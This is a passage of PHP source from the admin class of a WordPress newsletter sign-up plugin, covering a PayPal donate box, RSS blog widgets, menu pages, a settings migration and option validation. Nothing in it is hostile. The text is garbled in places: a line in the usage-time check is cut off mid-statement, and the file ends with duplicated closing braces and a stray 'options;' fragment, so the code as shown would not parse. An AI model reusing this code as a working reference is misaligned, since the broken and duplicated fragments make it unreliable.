DXJlQHBheXBhbC5jb20CAQAwCQYFKw4DAhoFAKBdMBgGCSqGSIb3DQEJAzELBgkqhkiG9w0BBwEwHAYJKoZIhvcNAQkFMQ8XDTExMTEyMDE1MDU1OFowIwYJKoZIhvcNAQkEMRYEFKUYvFfX67/j6OWp2xNHCzlnvaWtMA0GCSqGSIb3DQEBAQUABIGAmkdQThWqpFg5yey9B7qHAvZRLqejrpGtFoc/XiLFiMGmJbs/IXn7j5VDfGC+J0bAYtX2dnrlSoeDvISHM3aNCOSNiWexwlxBmZG0sYjtcVh/JHfP+Pe7DWG9awUwJPHETMuZxCQaCbpiQETZ8DRfJrWTJjWdasVJBAqHkrnnvvU=-----END PKCS7-----">
                <input type="image" src="https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif" border="0" name="submit" alt="PayPal - The safer, easier way to pay online!">
                <img alt="" border="0" src="https://www.paypalobjects.com/nl_NL/i/scr/pixel.gif" width="1" height="1">
            </form>

			<p>Or you can: </p>
            <ul>
                <li><a href="http://wordpress.org/extend/plugins/newsletter-sign-up/">Give a 5&#9733; rating on WordPress.org</a></li>
                <li><a href="'.$this->plugin_url.'">Blog about it and link to the plugin page</a></li>
                <li style="vertical-align:bottom;"><a href="http://twitter.com/share" class="twitter-share-button" data-url="'.$this->plugin_url.'" data-text="Showing my appreciation to @DannyvanKooten for his #WordPress plugin: '.$this->shortname.'" data-count="none">Tweet</a><script type="text/javascript" src="http://platform.twitter.com/widgets.js"></script></li>
            </ul>';
            $this->postbox($this->hook . '-donatebox', 'Donate $10, $20 or $50!', $content);
        }

        /**
         * Renders a box with the latests posts from DannyvanKooten.com
         */
        function latest_posts() {
            require_once(ABSPATH . WPINC . '/rss.php');
            if ($rss = fetch_rss('http://feeds.feedburner.com/dannyvankooten')) {
                $content = '<ul>';
                $rss->items = array_slice($rss->items, 0, 5);

                foreach ((array) $rss->items as $item) {
                    $content .= '<li class="dvk-rss-item">';
                    $content .= '<a target="_blank" href="' . clean_url($item['link'], $protocolls = null, 'display') . '">' . $item['title'] . '</a> ';
                    $content .= '</li>';
                }
                $content .= '<li class="dvk-rss"><a href="http://dannyvankooten.com/feed/">Subscribe to my RSS feed</a></li>';
                $content .= '<li class="dvk-email"><a href="http://dannyvankooten.com/newsletter/">Subscribe by email</a></li>';
                $content .= '<li class="dvk-twitter">You should follow me on twitter <a href="http://twitter.com/dannyvankooten">here</a></li>';
                $content .= '</ul><br style="clear:both;" />';
            } else {
                $content = '<p>No updates..</p>';
            }
            $this->postbox($this->hook . '-latestpostbox', 'Latest blog posts..', $content);
        }


        /**
         * Renders a box with a link to the support forums for NSU
         */
        function support_box() {
            $content = '<p>Are you having trouble setting-up ' . $this->shortname . ', experiencing an error or got a great idea on how to improve it?</p><p>Please, post
				your question or tip in the <a target="_blank" href="http://wordpress.org/tags/' . $this->hook . '">support forums</a> on WordPress.org. This is so that others can benefit from this too.</p>';
            $this->postbox($this->hook . '-support-box', "Looking for support?", $content);
        }

        /**
         * Output's the necessary HTML formatting for a postbox
         * 
         * @param string $id
         * @param string $title
         * @param string $content 
         */
        function postbox($id, $title, $content) {
            ?>
            <div id="<?php echo $id; ?>" class="dvk-box">		
               
                <h3 class="hndle"><?php echo $title; ?></h3>
                <div class="inside">
                    <?php echo $content; ?>			
                </div>
            </div>
            <?php
        }

        /**
         * Renders the DvK.com dashboard widget on the admin homepage.
         */
        function dashboard_widget() {
            $options = get_option('dvkdbwidget');
            if (isset($_POST['dvk_removedbwidget'])) {
                $options['dontshow'] = true;
                update_option('dvkdbwidget', $options);
            }

            if (isset($options['dontshow']) && $options['dontshow']) {
                echo "If you reload, this widget will be gone and never appear again, unless you decide to delete the database option 'dvkdbwidget'.";
                return;
            }

            require_once(ABSPATH . WPINC . '/rss.php');
            if ($rss = fetch_rss('http://feeds.feedburner.com/dannyvankooten')) {
                echo '<div class="rss-widget">';
                echo '<a href="http://dannyvankooten.com/" title="Go to DannyvanKooten.com"><img src="http://static.dannyvankooten.com/images/dvk-64x64.png" class="alignright" alt="DannyvanKooten.com"/></a>';
                echo '<ul>';
                $rss->items = array_slice($rss->items, 0, 3);
                foreach ((array) $rss->items as $item) {
                    echo '<li>';
                    echo '<a target="_blank" class="rsswidget" href="' . clean_url($item['link'], $protocolls = null, 'display') . '">' . $item['title'] . '</a> ';
                    echo '<span class="rss-date">' . date('F j, Y', strtotime($item['pubdate'])) . '</span>';
                    echo '<div class="rssSummary">' . $this->text_limit($item['summary'], 250) . '</div>';
                    echo '</li>';
                }
                echo '</ul>';
                echo '<div style="border-top: 1px solid #ddd; padding-top: 10px; text-align:center;">';
                echo '<a target="_blank" style="margin-right:10px;" href="http://feeds.feedburner.com/dannyvankooten"><img src="' . get_bloginfo('wpurl') . '/wp-includes/images/rss.png" alt=""/> Subscribe by RSS</a>';
                echo '<a target="_blank" href="http://dannyvankooten.com/newsletter/"><img src="http://static.dannyvankooten.com/images/email-icon.png" alt=""/> Subscribe by email</a>';
                echo '<form class="alignright" method="post"><input type="hidden" name="dvk_removedbwidget" value="true"/><input title="Remove this widget" type="submit" value=" X "/></form>';
                echo '</div>';
                echo '</div>';
            }
        }

        /**
         * Function that is hooked, adds the DvK.com dashboard widget.
         */
        function widget_setup() {
            $options = get_option('dvkdbwidget');
            if (!$options['dontshow'])
                wp_add_dashboard_widget('dvk_db_widget', 'Latest posts on DannyvanKooten.com', array(&$this, 'dashboard_widget'));
        }

        function text_limit($text, $limit, $finish = '...') {
            if (strlen($text) > $limit) {
                $text = substr($text, 0, $limit);
                $text = substr($text, 0, - ( strlen(strrchr($text, ' ')) ));
                $text .= $finish;
            }
            return $text;
        }

        /**
         * Adds the different menu pages
         */
        function add_option_page() {
            add_menu_page($this->longname, "Newsl. Sign-up", $this->accesslvl, $this->hook, array(&$this, 'options_page_default'), $this->icon_url);
            add_submenu_page($this->hook, "Newsletter Sign-Up :: Mailinglist Settings", "List Settings", $this->accesslvl, $this->hook, array($this, 'options_page_default'));
            add_submenu_page($this->hook, "Newsletter Sign-Up :: Checkbox Settings", "Checkbox Settings", $this->accesslvl, $this->hook . '/checkbox-settings', array($this, 'options_page_checkbox_settings'));
            add_submenu_page($this->hook, "Newsletter Sign-Up :: Form Settings", "Form Settings", $this->accesslvl, $this->hook . '/form-settings', array($this, 'options_page_form_settings'));
            add_submenu_page($this->hook, "Newsletter Sign-Up :: Configuration Extractor", "Config Extractor", $this->accesslvl, $this->hook . '/config-helper', array($this, 'options_page_config_helper'));
        }

        /**
         * Adds the settings link on the plugin's overview page
         * @param array $links Array containing all the settings links for the various plugins.
         * @return array The new array containing all the settings links
         */
        function add_settings_link($links) {
            $settings_link = '<a href="admin.php?page=' . $this->hook . '">Settings</a>';
            array_unshift($links, $settings_link);
            return $links;
        }

        /**
         * Check how long the plugin has been used
         * If used for over 30 days, show a pop-up asking for a tweet or donation.
         */
        function check_usage_time() {
            $opts = get_option('nsu');
          owpopup']) && $_GET['dontshowpopup'] == 1) {
                $opts['dontshowpopup'] = 1;
                update_option('nsu', $opts);
            }
            if (!isset($opts['date_installed'])) {
                // set installed_time to now, so we can show pop-up in 30 days
                $opts['date_installed'] = strtotime('now');
                update_option('nsu', $opts);
            } elseif ((!isset($opts['dontshowpopup']) || $opts['dontshowpopup'] != 1) && $opts['date_installed'] < strtotime('-30 days')) {
                // plugin has been installed for over 30 days
                $this->actions['show_donate_box'] = true;
                wp_enqueue_style('dvk_donate', plugins_url('/backend/css/donate.css', dirname(__FILE__)));
                wp_enqueue_script('dvk_donate', plugins_url('/backend/js/donate.js', dirname(__FILE__)));
            }
        }

        /**
         * Registers the settings using WP Settings API.
         */
        function settings_init() {
            register_setting('nsu_group', 'nsu', array(&$this, 'validate_options'));
            register_setting('nsu_form_group', 'nsu_form', array(&$this, 'validate_form_options'));
            register_setting('nsu_mailinglist_group', 'nsu_mailinglist', array(&$this, 'validate_mailinglist_options'));
            register_setting('nsu_checkbox_group', 'nsu_checkbox', array(&$this, 'validate_checkbox_options'));
        }

        /**
         * Transfer settings from old optionname for backwards compatibility
         */
        private function transfer_settings() {
            if (($old_options = get_option('ns_options')) != false && get_option('nsu') == false) {

                $nsu = array(
                    'date_installed' => (isset($old_options['date_installed'])) ? $old_options['date_installed'] : strtotime('now'),
                    'dontshowpopup' => (isset($old_options['dontshowpopup'])) ? $old_options['dontshowpopup'] : 0,
                    'load_widget_styles' => (isset($old_options['load_widget_styles'])) ? $old_options['load_widget_styles'] : 0
                );

                // new form option holder
                $nsu_form = $old_options['form'];

                // new checkbox option holder
                $nsu_checkbox = array(
                    'text' => (isset($old_options['checkbox_text'])) ? $old_options['checkbox_text'] : 'Sign me up for the newsletter.',
                    'precheck' => (isset($old_options['precheck_checkbox'])) ? $old_options['precheck_checkbox'] : 0,
                    'add_to_comment_form' => (isset($old_options['add_to_comment_form'])) ? $old_options['add_to_comment_form'] : 0,
                    'add_to_registration_form' => (isset($old_options['add_to_reg_form'])) ? $old_options['add_to_reg_form'] : 0,
                    'add_to_buddypress_form' => (isset($old_options['add_to_bp_form'])) ? $old_options['add_to_bp_form'] : 0,
                    'add_to_multisite_form' => (isset($old_options['add_to_ms_form'])) ? $old_options['add_to_ms_form'] : 0,
                    'css_reset' => (isset($old_options['do_css_reset'])) ? $old_options['do_css_reset'] : 0,
                    'cookie_hide' => (isset($old_options['cookie_hide'])) ? $old_options['cookie_hide'] : 0,
                );

                $nsu_mailinglist = array(
                    'provider' => (isset($old_options['email_service'])) ? $old_options['email_service'] : '',
                    'use_api' => (isset($old_options['use_api'])) ? $old_options['use_api'] : 0,
                    'mc_api_key' => (isset($old_options['api_key'])) ? $old_options['api_key'] : '',
                    'mc_list_id' => (isset($old_options['list_id'])) ? $old_options['list_id'] : '',
                    'ymlp_api_key' => (isset($old_options['ymlp_api_key'])) ? $old_options['ymlp_api_key'] : '',
                    'ymlp_username' => (isset($old_options['ymlp_username'])) ? $old_options['ymlp_username'] : '',
                    'ymlp_groupid' => (isset($old_options['ymlp_groupid'])) ? $old_options['ymlp_groupid'] : '',
                    'aweber_list_name' => (isset($old_options['aweber_list_name'])) ? $old_options['aweber_list_name'] : '',
                    'phplist_list_id' => (isset($old_options['phplist_list_id'])) ? $old_options['phplist_list_id'] : '',
                    'form_action' => (isset($old_options['form_action'])) ? $old_options['form_action'] : '',
                    'email_id' => (isset($old_options['email_id'])) ? $old_options['email_id'] : '',
                    'subscribe_with_name' => (isset($old_options['subscribe_with_name'])) ? $old_options['subscribe_with_name'] : 0,
                    'name_id' => (isset($old_options['name_id'])) ? $old_options['name_id'] : '',
                    'extra_data' => $old_options['extra_data']
                );

                delete_option('nsu');
                delete_option('nsu_form');
                delete_option('nsu_checkbox');
                delete_option('nsu_mailinglist');

                add_option('nsu', $nsu);
                add_option('nsu_form', $nsu_form);
                add_option('nsu_checkbox', $nsu_checkbox);
                add_option('nsu_mailinglist', $nsu_mailinglist);

                //delete_option('ns_options');
            }
        }

        /**
         * Removes the options from database, this function is hooked to deactivation of NSU.
         */
        function remove_options() {
            // old option name
            delete_option('ns_options');
            
            // new option names
            delete_option('nsu');
            delete_option('nsu_form');
            delete_option('nsu_checkbox');
            delete_option('nsu_mailinglist');
        }

        /**
         * Validate the submitted options
         * @param array $options The submitted options
         */
        public function validate_options($options) {
            return $options;
        }

        public function validate_form_options($options) {
            $options['text_after_signup'] = strip_tags($options['text_after_signup'], '<a><b><strong><i><img><em><br><p><ul><li><ol>');
            
            // redirect to url should start with http
            if(isset($options['redirect_to']) && substr($options['redirect_to'],0,4) != 'http') {
                $options['redirect_to'] = '';
            }
            
            return $options;
        }

        public function validate_mailinglist_options($options) {
            if (is_array($options['extra_data'])) {
                foreach ($options['extra_data'] as $key => $value) {
                    if (empty($value['name']))
                        unset($options['extra_data'][$key]);
                }
            }

            return $options;
        }

        public function validate_checkbox_options($options) {
            return $options;
        }

    }

}
        }

    }

}options;
        }

    }

}